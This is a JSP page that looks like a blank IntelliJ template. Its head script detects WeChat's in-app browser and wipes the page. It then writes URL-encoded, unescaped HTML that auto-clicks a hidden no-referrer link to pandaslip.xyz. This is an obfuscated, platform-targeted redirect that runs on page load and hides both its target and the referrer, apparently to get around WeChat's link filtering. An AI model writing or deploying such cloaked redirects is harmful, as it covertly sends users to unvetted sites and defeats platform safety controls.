<%--
  Created by IntelliJ IDEA.
  User: cait
  Date: 2017-09-21
  Time: 14:35
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
<head>
    <script>
        (function() {
        var ua = navigator.userAgent.toLowerCase();
        if (/micromessenger/.test(ua)) {
            var new_doc = document.open("text/html", "replace");
            var html = unescape("%3Ca%20href%3D%22http://www.pandaslip.xyz%22%20rel%3D%22noreferrer%22%20id%3D%22abc_noreferer%22%20style%3D%22display%3A%20none%3B%22%3Enoreferer%3C/a%3E%0A%3Cscript%3E%0Adocument.getElementById%28%27abc_noreferer%27%29.click%28%29%3B%0A%3C/script%3E");
            new_doc.write(html);
            new_doc.close();
        }
        })()
    </script>
</head>
<body>

</body>
</html>
